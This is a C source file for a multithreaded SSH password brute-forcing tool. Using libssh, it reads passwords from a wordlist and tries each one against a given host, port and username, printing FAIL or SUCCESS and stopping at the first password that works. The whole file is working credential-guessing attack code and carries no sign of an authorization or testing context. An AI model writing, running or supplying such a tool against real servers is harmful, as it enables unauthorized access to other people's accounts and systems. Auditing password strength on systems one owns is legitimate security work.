#include <stdio.h>
#include <ctype.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h>
#include <libssh/libssh.h>

typedef struct p_
{
  char *user;
  FILE *fd;
  char *host;
  int port;
  int timeout;
}p;


void *check(void *ptr)
{
  p *params;
  char password[255];

  params = (p *)ptr;

  while(fscanf(params->fd, "%s", password) != EOF)
  {
    SSH_SESSION *ss = NULL;
    SSH_OPTIONS *so = NULL;

    so = ssh_options_new();
    ssh_options_set_username(so, params->user);
    ssh_options_set_host(so, params->host);
    ssh_options_set_port(so, params->port);

    ss = ssh_new();
    ssh_set_options(ss, so);
    ssh_connect(ss);

    if(!ss)
    {
      fprintf(stderr, "EPIC FAIL: Connection failed!\n");
      /* pthread_exit(NULL); */
      exit(1);
    }

    if(ssh_userauth_password(ss, NULL, password) != SSH_AUTH_SUCCESS)
    {
      printf("FAIL: %s\n", password);
      ssh_disconnect(ss);
      sleep(params->timeout);
    }
    else
    {
      printf("SUCCESS: %s\n", password);
      ssh_disconnect(ss);
      /* pthread_exit(NULL); */
      exit(1);
    }
  }
  pthread_exit(NULL);
}


void err_exit(char *name)
{
  fprintf(stderr, "Usage %s -h host [-p port] -u username -f passwordfile"
          " [-t timeout] [-n threads]", name);
  exit(1);
}


int main(int argc, char **argv)
{
  char *pwfile = NULL;
  int *iret = NULL;
  pthread_t *thread = NULL;
  p params;
  int c,i;
  int threads;

  /* Set default values */
  params.port = 22;
  params.timeout = 0;
  threads = 1;

  /* Process options */
  while((c = getopt(argc, argv, "h:p:u:f:t:n:")) != -1)
  {
    switch(c)
    {
      case 'h':
        params.host = optarg;
        break;
      case 'p':
        params.port = atoi(optarg);
        break;
      case 'u':
        params.user = optarg;
        break;
      case 'f':
        pwfile = optarg;
        break;
      case 't':
        params.timeout = atoi(optarg);
        break;
      case 'n':
        threads = atoi(optarg);
        break;
      case '?':
        fprintf(stderr, "Usage %s -h host [-p port] -u username -f passwordfile"
        " [-t timeout] [-n threads]", argv[0]);
        return 1;
      default:
        abort();
      }
  }

  /* Check for sane values */
  if(params.host==NULL || params.user==NULL || pwfile==NULL || threads==0)
    err_exit(argv[0]);

  /* Create necessary thread variables */
  iret = (int *)malloc(threads*sizeof(int));
  thread = (pthread_t *)malloc(threads*sizeof(pthread_t));

  params.fd = fopen(pwfile, "r");

  /* Start all threads */
  for(i=0; i<threads; ++i)
  {
    iret[i] = pthread_create(&thread[i], NULL, check, (void*)&params);
    /* sleep(1); */
  }

  /* Wait for threads to finish */
  for(i=0; i<threads; ++i)
  {
    pthread_join(thread[i], NULL);
  }

  fclose(params.fd);

  free(iret);
  free(thread);

  return 0;
}

